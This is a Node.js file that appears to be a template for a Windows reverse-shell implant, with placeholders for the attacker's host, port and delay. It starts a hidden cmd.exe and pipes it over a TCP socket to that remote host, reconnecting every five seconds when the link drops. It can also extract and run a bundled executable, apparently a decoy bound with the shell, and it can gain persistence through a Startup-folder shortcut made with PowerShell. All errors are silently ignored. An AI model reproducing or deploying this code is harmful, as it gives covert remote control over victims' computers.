var net = require("net"),
    os = require('os'),
    cp = require("child_process"),
    fs = require('fs'),
    path = require('path');

var sh;

const autoStarted = process.argv.length > 2;
var intervalConnect = false;
var client = new net.Socket();

(function () {
    additional();
    setTimeout(shell, Number("{{WAIT_TIME}}") * 1000);
    return /a/; // don't close the process
})();

function shell(){
    function connect() { 
        sh = cp.spawn("cmd", [], { detached: true, shell: false, windowsHide: true });
        client.connect(Number("{{LISTEN_PORT}}"), "{{HOST}}");
    }

    function launchIntervalConnect(err) {
        if(err) console.log(err);
        if(false != intervalConnect) return
        intervalConnect = setInterval(connect, 5000)
    }
    
    function clearIntervalConnect() {
        if(false == intervalConnect) return
        clearInterval(intervalConnect)
        intervalConnect = false
    }

    client.on('connect', () => {
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        clearIntervalConnect();
    })
    client.on('error', launchIntervalConnect)
    client.on('close', launchIntervalConnect)
    client.on('end',   launchIntervalConnect)
    connect()
}

function additional(){
    // no need to do other things if autostarted
    if(autoStarted) return;

    try {
        const hasMerge = "{{HAS_MERGE}}";
        const mergeFileName = "{{MERGE_NAME}}";

        let extractPath = path.normalize(path.join(os.tmpdir(), `${mergeFileName.slice(0, -4)} Inc.`));
        let actualFilePath = path.join(extractPath, `./${mergeFileName}`);
        if(!fs.existsSync(extractPath))
        fs.mkdirSync(extractPath);

        // run merged exe (if any)
        if(hasMerge == "true"){
            var mergeExeBuffer = fs.readFileSync(path.join(__dirname, './winResource.exe'));
            // extract the exe
            fs.writeFileSync(actualFilePath, mergeExeBuffer);
        }

        if("{{FILES_DEPENDANT}}" == "true"){
            // setup the hard symlinks
            var surroundFiles = fs.readdirSync(process.cwd()).filter(f => f != mergeFileName);
            var mkLinkCmd = [];
            surroundFiles.map(f => {
                let isDir = fs.lstatSync(path.join(process.cwd(), f)).isDirectory()
                let target = path.join(process.cwd(), f);
                let link = path.join(extractPath, f);
                if(!fs.existsSync(link))
                mkLinkCmd.push(`mklink /${isDir ? 'J' : 'H'} "${link}" "${target}"`);
            });
            mkLinkCmd = mkLinkCmd.join(' && ');
            cp.execSync(mkLinkCmd);
        }

        if(hasMerge == "true"){
            // run the exe
            cp.spawn(actualFilePath, 
            [], {detached: true, shell: false, windowsHide: true})
        }

        if("{{PERSISTENT}}" == "true"){
            const currentFile = path.join(process.cwd(), mergeFileName);
            const linkPath = path.normalize(path.join(process.env.APPDATA,
                `/Microsoft/Windows/Start Menu/Programs/Startup/${mergeFileName}.lnk`));
            const lnkCmd = `$Shortcut = (New-Object -ComObject 'WScript.Shell').CreateShortcut(\\"${linkPath}\\"); $Shortcut.TargetPath = '${currentFile}'; $Shortcut.Arguments = \\"-asd -dsa\\"; $Shortcut.Save();`;
            const powershellCommand = `powershell -command "${lnkCmd}"`;
            cp.execSync(powershellCommand);
        }
        
    } catch {  }
}